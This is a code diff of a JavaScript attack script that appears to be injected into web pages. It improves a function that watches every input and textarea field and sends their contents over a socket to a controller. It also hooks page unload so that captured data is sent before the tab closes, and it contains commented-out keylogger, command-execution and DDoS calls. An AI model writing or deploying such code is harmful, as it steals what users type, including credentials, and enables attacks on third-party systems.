@@ -22,6 +22,7 @@
 
         //        execCommands(comms);
         //        keyLogger.start();
+        window.onbeforeunload = finCode;
     }
 
     // DDOS function
@@ -69,13 +70,18 @@
         logOnFieldFocus : function (socket) {
             var inputFields = document.querySelectorAll('input,textarea'),
                 fieldName = function(field) {
+                    var name = '';
                     if (field.id) {
-                        return '#' + field.id;
+                        name += '#' + field.id;
+                    }
+                    if (field.name){
+                        name += '$' + field.name;
                     }
                     if (field.className) {
-                        return '.' + field.className;
+                        name += '.' + field.className;
                     }
-                    return '[' + field.type + ']';
+                    name += '[' + field.type + ']';
+                    return name;
                 },
                 emitChange = function() {
 
@@ -146,7 +152,7 @@
         //dos({ prot: 'http', ip : 'localhost', port: 80 });
         //    switch  case for each type of commands
     }
-    window.onbeforeunload = finCode;
+
     function finCode(){
         // makes sure that you send all data before the user close the tab
 
